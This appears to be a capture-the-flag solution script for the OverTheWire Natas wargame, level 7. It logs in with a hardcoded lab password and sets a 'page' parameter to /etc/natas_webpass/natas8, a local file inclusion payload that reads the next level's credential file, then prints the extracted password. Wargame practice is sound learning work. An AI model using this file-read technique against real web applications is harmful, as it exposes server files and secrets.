#!/usr/bin/env python

import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org/' % username
payload = {'page': '/etc/natas_webpass/natas8'}

r = requests.get(url, auth=(username, password), params=payload)

password = re.findall('(?<=<br>\n)([A-z0-9]*)', r.text)[1]

print(password)